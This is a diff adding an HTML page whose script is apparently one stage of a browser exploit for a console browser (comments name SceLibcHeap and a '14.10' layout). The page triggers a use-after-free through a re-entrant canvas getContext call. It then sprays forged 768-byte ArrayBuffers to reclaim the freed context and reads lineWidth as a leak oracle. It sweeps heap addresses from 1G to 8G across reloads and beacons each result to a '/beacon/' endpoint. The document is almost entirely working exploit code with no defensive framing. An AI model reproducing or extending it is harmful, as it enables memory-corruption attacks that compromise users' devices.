@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V910</title></head>
+<body><pre id="out">V910 — dense 1G-4G sweep, offset-invariant forge</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V910-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+
+/*
+ * v909: the synchronously freed grown-state ctx is zeroed at free — the read
+ * dies before B1 can matter. The only path back to an oracle is forging
+ * m_stateStack inside the AB that reclaims the 768B ctx chunk, with the
+ * offset-invariant all-words forge (every 8-byte word = P).
+ * v903's wide sweep stepped 512MB — a ~128MB SceLibcHeap arena between grid
+ * points is invisible. This probe sweeps 1G-4G (the plausible SceLibc area
+ * per the 14.10 game-process layout) at 4MB granularity, then 4-8G @8MB.
+ * ?b=N selects the band; localStorage continues within the band; ?r=1 resets.
+ */
+
+var hi32 = function(a){ return Math.floor(a / 4294967296); };
+var lo32 = function(a){ return a >>> 0; };
+var TARGETS = [];
+var BANDS = [
+  function(){ for (var a = 0x300000000; a < 0x400000000; a += 0x400000) TARGETS.push([hi32(a), lo32(a), '3G+' + ((a - 0x300000000) / 1048576) + 'M']); },
+  function(){ for (var a = 0x200000000; a < 0x300000000; a += 0x400000) TARGETS.push([hi32(a), lo32(a), '2G+' + ((a - 0x200000000) / 1048576) + 'M']); },
+  function(){ for (var a = 0x100000000; a < 0x200000000; a += 0x400000) TARGETS.push([hi32(a), lo32(a), '1G+' + ((a - 0x100000000) / 1048576) + 'M']); },
+  function(){ for (var a = 0x400000000; a < 0x800000000; a += 0x800000) TARGETS.push([hi32(a), lo32(a), '4G+' + ((a - 0x400000000) / 1048576) + 'M']); }
+];
+var band = 0;
+try {
+  var mb = location.search.match(/b=(\d)/);
+  if (mb) { localStorage.setItem('v910_band', mb[1]); localStorage.setItem('v910_attempt', '0'); }
+  band = parseInt(localStorage.getItem('v910_band')) || 0;
+} catch(e) {}
+if (band < BANDS.length) BANDS[band]();
+
+var MAX = TARGETS.length;
+var attempt = 0;
+try {
+  if (location.search.indexOf('r=1') >= 0) localStorage.setItem('v910_attempt', '0');
+  attempt = parseInt(localStorage.getItem('v910_attempt')) || 0;
+} catch(e) {}
+
+bk('BOOT', 'band=' + band + ' attempt=' + attempt + '/' + MAX);
+if (attempt >= MAX) {
+  bk('EXHAUSTED', 'band-' + band + '-all-' + MAX + '-crashed');
+} else {
+  var tgt = TARGETS[attempt];
+  var tgtHi = tgt[0], tgtLo = tgt[1], tgtDesc = tgt[2];
+  var tgtHex = '0x' + ('00000000' + tgtHi.toString(16)).slice(-8) + ('00000000' + tgtLo.toString(16)).slice(-8);
+  bk('TGT', 'n=' + attempt + '|addr=' + tgtHex + '|' + tgtDesc);
+  try { localStorage.setItem('v910_attempt', String(attempt + 1)); } catch(e) {}
+
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var innerCtx = null;
+  var uafOpts = {};
+  Object.defineProperty(uafOpts, 'alpha', {get: function() {
+    innerCtx = canvas.getContext('2d');
+    return true;
+  }});
+  canvas.getContext('bitmaprenderer', uafOpts);
+  if (!innerCtx) { bk('FAIL', 'no-uaf'); }
+  else {
+    for (var f = 0; f < 600; f++) { var tmp = new ArrayBuffer(16); }
+    var dvs = [];
+    for (var s = 0; s < 200; s++) {
+      var ab = new ArrayBuffer(768);
+      var dv = new DataView(ab);
+      /* offset-invariant forge: every 8-byte word = P */
+      for (var o = 0; o < 768; o += 8) {
+        dv.setUint32(o, tgtLo, true);
+        dv.setUint32(o + 4, tgtHi, true);
+      }
+      dvs.push(dv);
+    }
+    bk('SPRAY', 'n=200|tgt=' + tgtHex);
+    var leaked = innerCtx.lineWidth;
+    innerCtx = null;
+    for (var c = 0; c < dvs.length; c++) {
+      for (var o2 = 0; o2 < 768; o2 += 8) dvs[c].setFloat64(o2, 0, true);
+    }
+    var hex = (function(v){var b8=new ArrayBuffer(8),fa=new Float64Array(b8),u=new Uint32Array(b8);fa[0]=v;return ('00000000'+u[1].toString(16)).slice(-8)+('00000000'+u[0].toString(16)).slice(-8);})(leaked);
+    bk('HIT', 'addr=' + tgtHex + '|lw=' + leaked + '|hex=' + hex);
+    try { localStorage.setItem('v910_attempt', String(MAX + 1)); localStorage.setItem('v910_hit', tgtHex + '|' + hex); } catch(e) {}
+  }
+}
+</script></body></html>
